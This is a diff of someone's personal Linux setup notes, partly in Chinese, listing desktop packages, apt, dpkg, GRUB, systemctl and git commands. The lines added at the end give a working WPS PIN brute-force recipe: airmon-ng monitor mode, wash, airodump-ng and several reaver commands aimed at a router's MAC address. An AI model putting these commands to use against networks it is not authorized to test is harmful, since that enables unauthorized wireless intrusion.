@@ -4,35 +4,43 @@ hwclock --show
 hwclock --systohc
 hwclock --hctosys
 
+sudo add-apt-repository ppa:nilarimogard/webupd8
+sudo apt-get update
+sudo apt-get install ap-hotspot
 
-X-server		xorg		/etc/X11/xorg.conf
+base-files
+
+X-server		    xorg		/etc/X11/xorg.conf
 X-client
 window manager		openbox 	~/.config/openbox/
-			fvwm
+			        fvwm
 x display manager	gdm3
-			xdm
-			lightdm
-desktop environments	gnome,
-taskbar			tint2
-
+			        xdm
+			        lightdm
 
 amdcccle  
 gnome-shell
-tint2 feh conky volumeicon-alsa vim vlc gnome-terminal pidgin xcompmgr compton
+
+//桌面环境
+    openbox                 窗口管理器
+    tint2                   任务栏
+    feh                     壁纸 
+    conky                   监视器
+    wbar                    托盘
+    volumeicon-alsa         音量管理
+    alsamixergui            
+    vim                     文本编辑器
+    vlc                     视频播放器
+    gnome-terminal          虚拟终端
+    pidgin                  通讯平台
+    xcompmgr compton        X特效
+    wicd-gtk || network-manager-applet
+    cairo-dock -oc || docky
+    fcitx || ibus
+tmux zsh vim 
+gcc make gdb git docker 
 wine
 bcloud-gui
-cairo-dock -oc || docky
-wicd-gtk || network-manager-applet
-fcitx || ibus
-
-
-dpkg --add-architecture i386
-dpkg --remove-architecture i386
-api libgl1-fglrx-glx:i386
-
-GRUB_GFXPAYLOAD_LINUX=1920x1080
-api amd64-microcode
-
 HAL 硬件侦测
 firefox || chromium
 deluge || filezilla || uget || wget || aria2
@@ -42,19 +50,26 @@ rhythmbox || audacious
 im-config
 virtualbox
 eog || gimp || inkscape
-evince || kchmviewer
+evince || kchmviewer || apvlv
 stardict
-nautilus || rox-files || pcmanfm
+nautilus || rox-files || pcmanfm || thunar || vifm || xfe
 synaptic
 zim
 gnome-disk-utility
 gnome-packagekit
 bash-completion
-# latex
+# latex texmaker
 mutt
 rsync
 file-roller || p7zip
 
+dpkg --add-architecture i386
+dpkg --remove-architecture i386
+api libgl1-fglrx-glx:i386
+
+//tty 分辨率修改
+GRUB_GFXPAYLOAD_LINUX=1920x1080
+api amd64-microcode
 
 任务                新指令
 使某服务自动启动    systemctl enable httpd.service
@@ -113,3 +128,13 @@ git
     git remote add symy https://github.com/dsxyr/symy.git
     git push -u symy master
 
+    ifconfig –a              //确认你用哪一个网卡WLAN0或WLAN1
+    airmon-ng start wlan0     //开启监听模式
+    wash –i mon0 –C         //查看开启wps的无线路由器
+    airodump-ng mon0          //查看周边AP信息（抓包）
+    reaver –i mon0 –b MAC –a –S –vv –d 3 –t 3  //开始穷举PIN码
+    reaver –i mon0 –b MAC –a –S –vv –d 0        //加快速度为1秒
+    reaver –i mon0 –b MAC –a –S –vv –p xxxx     //从前4位PIN码开始
+    reave的进度表文件保存在:
+        1.3版：/etc/reaver/MAC地址.wpc
+        1.4版：/usr/local/etc/reaver/MAC地址.wpc
